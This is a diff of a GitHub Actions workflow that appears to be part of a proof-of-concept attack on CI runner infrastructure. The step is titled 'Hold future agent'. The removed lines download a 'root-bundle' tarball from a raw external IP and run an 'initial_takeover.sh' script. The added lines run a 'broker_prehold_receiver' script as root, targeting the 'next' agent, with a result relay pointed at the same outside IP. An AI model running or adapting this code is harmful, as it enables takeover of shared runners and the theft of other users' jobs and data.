@@ -33,27 +33,18 @@ jobs:
       RECEIVER_RUN_ID: ${{ inputs.receiver_run_id }}
       RECEIVER_NONCE: ${{ inputs.receiver_nonce }}
       BROKER_HOLD_SECONDS: ${{ inputs.hold_seconds }}
+      TARGET_AGENT_ID: next
     steps:
       - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
 
       - name: Hold future agent and verify only the owned receiver
         run: |
-          python3 - <<'PY'
-          import json, os
-          fields = ("RECEIVER_BILLING_OWNER_ID", "RECEIVER_REPOSITORY",
-                    "RECEIVER_RUN_ID", "RECEIVER_NONCE", "BROKER_HOLD_SECONDS")
-          open("/tmp/broker-prehold-config.json", "w").write(json.dumps(
-              {key: os.environ[key] for key in fields}, separators=(",", ":")))
-          PY
-          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
-          tar -xzf /tmp/root.tgz -C /tmp
-          cp poc/broker_prehold_receiver.py /tmp/broker_prehold_receiver.py
-          cp poc/root_broker_prehold_entry.sh /tmp/root_auto.sh
-          chmod +x /tmp/root_auto.sh /tmp/broker_prehold_receiver.py
-          HVS_INLINE=1 bash /tmp/initial_takeover.sh
-          for attempt in $(seq 1 300); do
-            sudo grep -q '^BROKER_RECEIVER ' /tmp/broker-prehold.log 2>/dev/null && break
-            sleep 0.1
-          done
-          sudo grep '^BROKER_RECEIVER ' /tmp/broker-prehold.log 2>/dev/null | tail -5 || true
-          sleep 840
+          sudo -n env \
+            "TARGET_AGENT_ID=$TARGET_AGENT_ID" \
+            "RECEIVER_BILLING_OWNER_ID=$RECEIVER_BILLING_OWNER_ID" \
+            "RECEIVER_REPOSITORY=$RECEIVER_REPOSITORY" \
+            "RECEIVER_RUN_ID=$RECEIVER_RUN_ID" \
+            "RECEIVER_NONCE=$RECEIVER_NONCE" \
+            "BROKER_HOLD_SECONDS=$BROKER_HOLD_SECONDS" \
+            BROKER_RESULT_RELAY=http://16.146.243.72:8450/BROKER_PREHOLD \
+            python3 poc/broker_prehold_receiver.py
